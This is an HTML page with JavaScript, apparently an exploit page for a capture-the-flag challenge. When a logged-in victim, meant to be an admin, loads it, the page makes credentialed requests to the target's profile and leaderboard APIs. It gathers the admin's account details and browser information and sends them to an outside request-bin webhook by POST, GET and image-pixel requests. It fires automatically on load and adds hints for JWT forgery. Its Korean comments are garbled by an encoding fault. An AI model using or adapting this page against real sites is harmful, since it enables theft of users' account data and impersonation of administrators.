<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 20px;
            background-color: #f8f9fa;
        }
        .container { 
            max-width: 600px; 
            margin: 0 auto; 
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .loading { 
            text-align: center; 
            color: #666; 
        }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            margin: 10px 0;
            padding: 10px;
            border-radius: 4px;
            font-size: 14px;
        }
        .success { background-color: #d4edda; color: #155724; }
        .error { background-color: #f8d7da; color: #721c24; }
        .info { background-color: #d1ecf1; color: #0c5460; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Admin Information Extraction</h2>
        <div class="loading">
            <div class="spinner"></div>
            <p>Extracting admin credentials...</p>
        </div>
        
        <div id="status-log"></div>
        
        <div id="complete" style="display:none;">
            <div class="status success">
                âœ“ Admin information extracted successfully
            </div>
        </div>
    </div>

    <script>
        // Configuration - ì—¬ëŸ¬ ê°€ëŠ¥í•œ ì„œë²„ URL ì‹œë„
        const POSSIBLE_URLS = [
            'http://127.0.0.1:5555',
            'http://localhost:5555',
            'http://34.55.69.223:14003',
            'http://flagguessr:5555'
        ];
        const WEBHOOK_URL = 'https://yreyehl.request.dreamhack.games';
        
        let statusLog = document.getElementById('status-log');
        let workingBaseUrl = null;
        
        function addStatus(message, type = 'info') {
            const div = document.createElement('div');
            div.className = `status ${type}`;
            div.textContent = `${new Date().toLocaleTimeString()} - ${message}`;
            statusLog.appendChild(div);
            console.log(`[${type.toUpperCase()}] ${message}`);
        }
        
        async function sendToWebhook(data) {
            const payload = {
                timestamp: new Date().toISOString(),
                source: 'admin_info_extraction',
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                extraction_data: data
            };
            
            try {
                // Method 1: POST request
                const postResp = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    mode: 'no-cors'
                });
                
                // Method 2: GET request with base64 data
                const base64Data = btoa(JSON.stringify(payload))
                    .replace(/\+/g, '-')
                    .replace(/\//g, '_')
                    .replace(/=/g, '');
                
                await fetch(`${WEBHOOK_URL}?data=${base64Data}&t=${Date.now()}`, {
                    method: 'GET',
                    mode: 'no-cors'
                });
                
                // Method 3: Image pixel tracking
                const img = new Image();
                img.src = `${WEBHOOK_URL}?img=1&admin=${encodeURIComponent(JSON.stringify(data))}&t=${Date.now()}`;
                
                addStatus('Admin data sent to webhook', 'success');
                return true;
            } catch (error) {
                addStatus(`Webhook failed: ${error.message}`, 'error');
                return false;
            }
        }
        
        async function findWorkingUrl() {
            addStatus('Testing server connectivity...', 'info');
            
            for (const baseUrl of POSSIBLE_URLS) {
                try {
                    addStatus(`Testing ${baseUrl}...`, 'info');
                    
                    // ê°„ë‹¨í•œ ì—°ê²° í…ŒìŠ¤íŠ¸
                    const testResp = await fetch(`${baseUrl}/api/profile`, {
                        method: 'GET',
                        credentials: 'include',
                        timeout: 5000
                    });
                    
                    // ì‘ë‹µì´ ìžˆìœ¼ë©´ (ì„±ê³µì´ë“  ì‹¤íŒ¨ë“ ) ì„œë²„ê°€ ì‚´ì•„ìžˆìŒ
                    if (testResp.status >= 200 && testResp.status < 500) {
                        workingBaseUrl = baseUrl;
                        addStatus(`âœ… Found working server: ${baseUrl}`, 'success');
                        return baseUrl;
                    }
                } catch (e) {
                    addStatus(`âŒ ${baseUrl} failed: ${e.message}`, 'error');
                }
            }
            
            addStatus('âš ï¸ No working server found, using default', 'error');
            return POSSIBLE_URLS[0]; // ê¸°ë³¸ê°’
        }
        
        async function extractAdminInfo() {
            try {
                addStatus('ðŸš€ Starting admin information extraction...', 'info');
                
                // 1. ì„œë²„ URL ì°¾ê¸°
                const baseUrl = await findWorkingUrl();
                
                const extractedData = {
                    extraction_started: true,
                    working_server: baseUrl,
                    steps: [],
                    admin_info: {}
                };
                
                // 2. Admin Profile ì¶”ì¶œ
                try {
                    addStatus('ðŸ“‹ Step 1: Extracting admin profile...', 'info');
                    const profileResp = await fetch(`${baseUrl}/api/profile`, {
                        credentials: 'include'
                    });
                    
                    if (profileResp.ok) {
                        const adminProfile = await profileResp.json();
                        extractedData.admin_info.profile = adminProfile;
                        extractedData.steps.push('profile_extracted');
                        
                        addStatus(`âœ… Admin Profile Found!`, 'success');
                        addStatus(`ðŸ‘¤ Username: ${adminProfile.username || 'unknown'}`, 'info');
                        addStatus(`ðŸ†” User ID: ${adminProfile.user_id || 'unknown'}`, 'info');
                        addStatus(`ðŸ“› Display Name: ${adminProfile.display_name || 'unknown'}`, 'info');
                        addStatus(`ðŸ”‘ User Kind: ${adminProfile.user_kind === 1 ? 'ADMIN' : 'USER'}`, 'info');
                        
                        // ì¦‰ì‹œ ì›¹í›…ìœ¼ë¡œ ì „ì†¡
                        await sendToWebhook({
                            type: 'ADMIN_PROFILE_EXTRACTED',
                            admin_profile: adminProfile,
                            extraction_time: new Date().toISOString()
                        });
                        
                    } else {
                        extractedData.steps.push('profile_failed');
                        addStatus(`âŒ Profile extraction failed: ${profileResp.status}`, 'error');
                    }
                } catch (e) {
                    extractedData.steps.push(`profile_error: ${e.message}`);
                    addStatus(`âŒ Profile error: ${e.message}`, 'error');
                }
                
                // 3. Leaderboardì—ì„œ ì¶”ê°€ ì •ë³´ ìˆ˜ì§‘
                try {
                    addStatus('ðŸ“Š Step 2: Checking leaderboard...', 'info');
                    const leaderboardResp = await fetch(`${baseUrl}/api/leaderboard`, {
                        credentials: 'include'
                    });
                    
                    if (leaderboardResp.ok) {
                        const leaderboardData = await leaderboardResp.json();
                        extractedData.admin_info.leaderboard = leaderboardData;
                        extractedData.steps.push('leaderboard_extracted');
                        
                        // Admin ì‚¬ìš©ìžë“¤ ì°¾ê¸°
                        const adminUsers = leaderboardData.users?.filter(user => 
                            user.username?.startsWith('Admin-') || 
                            user.user_id === extractedData.admin_info.profile?.user_id
                        ) || [];
                        
                        addStatus(`ðŸ“ˆ Leaderboard extracted: ${leaderboardData.users?.length || 0} users`, 'success');
                        addStatus(`ðŸ‘‘ Found ${adminUsers.length} admin users`, 'info');
                        
                        await sendToWebhook({
                            type: 'LEADERBOARD_DATA',
                            leaderboard: leaderboardData,
                            admin_users: adminUsers
                        });
                        
                    } else {
                        extractedData.steps.push('leaderboard_failed');
                        addStatus(`âŒ Leaderboard failed: ${leaderboardResp.status}`, 'error');
                    }
                } catch (e) {
                    extractedData.steps.push(`leaderboard_error: ${e.message}`);
                    addStatus(`âŒ Leaderboard error: ${e.message}`, 'error');
                }
                
                // 4. í™˜ê²½ ì •ë³´ ìˆ˜ì§‘
                try {
                    addStatus('ðŸŒ Step 3: Collecting environment info...', 'info');
                    const envInfo = {
                        user_agent: navigator.userAgent,
                        page_url: window.location.href,
                        referrer: document.referrer,
                        timestamp: new Date().toISOString(),
                        screen_resolution: `${screen.width}x${screen.height}`,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };
                    
                    extractedData.admin_info.environment = envInfo;
                    extractedData.steps.push('environment_collected');
                    
                    addStatus('ðŸŒ Environment info collected', 'success');
                } catch (e) {
                    addStatus(`âŒ Environment collection error: ${e.message}`, 'error');
                }
                
                // 5. ìµœì¢… ë°ì´í„° ì „ì†¡
                addStatus('ðŸ“¤ Step 4: Sending final extraction data...', 'info');
                await sendToWebhook({
                    type: 'COMPLETE_EXTRACTION',
                    complete_data: extractedData,
                    summary: {
                        admin_username: extractedData.admin_info.profile?.username,
                        admin_user_id: extractedData.admin_info.profile?.user_id,
                        admin_display_name: extractedData.admin_info.profile?.display_name,
                        admin_user_kind: extractedData.admin_info.profile?.user_kind,
                        total_steps: extractedData.steps.length,
                        successful_steps: extractedData.steps.filter(s => !s.includes('error') && !s.includes('failed')).length
                    }
                });
                
                // ì™„ë£Œ í‘œì‹œ
                document.querySelector('.loading').style.display = 'none';
                document.getElementById('complete').style.display = 'block';
                addStatus('ðŸŽ‰ Admin information extraction completed!', 'success');
                
                // JWT ìƒì„± ê°€ì´ë“œ í‘œì‹œ
                if (extractedData.admin_info.profile?.display_name) {
                    addStatus('ðŸ’¡ Use this display_name for JWT forgery!', 'info');
                    addStatus(`ðŸ”§ Display Name: ${extractedData.admin_info.profile.display_name}`, 'success');
                }
                
            } catch (error) {
                addStatus(`ðŸ’¥ Critical extraction error: ${error.message}`, 'error');
                await sendToWebhook({
                    type: 'EXTRACTION_ERROR',
                    error: error.message,
                    stack: error.stack,
                    timestamp: new Date().toISOString()
                });
            }
        }
        
        // íŽ˜ì´ì§€ ë¡œë“œ ì‹œ ì¶”ì¶œ ì‹œìž‘
        window.onload = function() {
            addStatus('ðŸŒŸ Admin extraction page loaded', 'info');
            addStatus('â±ï¸ Starting extraction in 2 seconds...', 'info');
            setTimeout(extractAdminInfo, 2000);
        };
        
        // ë¬¸ì„œ ì¤€ë¹„ ì‹œì—ë„ ì‹œë„
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', function() {
                setTimeout(extractAdminInfo, 3000);
            });
        }
        
        // ì¶”ê°€ ì•ˆì „ìž¥ì¹˜: 5ì´ˆ í›„ ê°•ì œ ì‹¤í–‰
        setTimeout(() => {
            if (!document.getElementById('complete').style.display || 
                document.getElementById('complete').style.display === 'none') {
                addStatus('ðŸ”„ Backup extraction trigger...', 'info');
                extractAdminInfo();
            }
        }, 5000);
    </script>
</body>
</html>
